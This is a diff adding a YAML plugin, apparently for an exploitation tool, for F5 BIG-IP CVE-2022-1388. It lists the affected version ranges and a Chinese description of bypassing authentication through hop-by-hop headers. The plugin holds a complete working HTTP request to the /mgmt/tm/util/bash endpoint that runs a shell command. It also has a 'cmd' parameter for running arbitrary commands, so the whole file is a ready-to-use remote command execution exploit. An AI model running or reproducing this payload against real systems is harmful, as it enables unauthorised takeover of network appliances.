@@ -1,0 +1,29 @@
+info:
+    app: F5
+    name: CVE-2022-1388
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2022-05-05"
+    create_date: "2024-10-06 07:14:50"
+    update_date: "2024-10-06 07:14:50"
+    scope: |-
+        16.1.0 <= F5 BIG-IP <= 16.1.2
+        15.1.0 <= F5 BIG-IP <= 15.1.5
+        14.1.0 <= F5 BIG-IP <= 14.1.4
+        13.1.0 <= F5 BIG-IP <= 13.1.4
+        12.1.0 <= F5 BIG-IP <= 12.1.6
+        11.6.1 <= F5 BIG-IP <= 11.6.5
+    description: 通过hop-by-hop漏洞绕过CVE-2021-22986，从而访问未授权接口执行命令
+    vul_id: CVE-2022-1388
+    payload: "POST /mgmt/tm/util/bash HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nContent-Length: 43\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\nAuthorization: Basic YWRtaW46QVNhc1M=\nConnection: Keep-alive, X-F5-Auth-Token\nContent-Type: application/json\nX-F5-Auth-Token: a\nAccept-Encoding: gzip, deflate\nConnection: close\n\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
+    reference: https://mp.weixin.qq.com/s/6gVZVRSDRmeGcNYjTldw1Q
+    vul_type: 命令执行
+payloads:
+    - name: cmd
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: ""
+            required: true
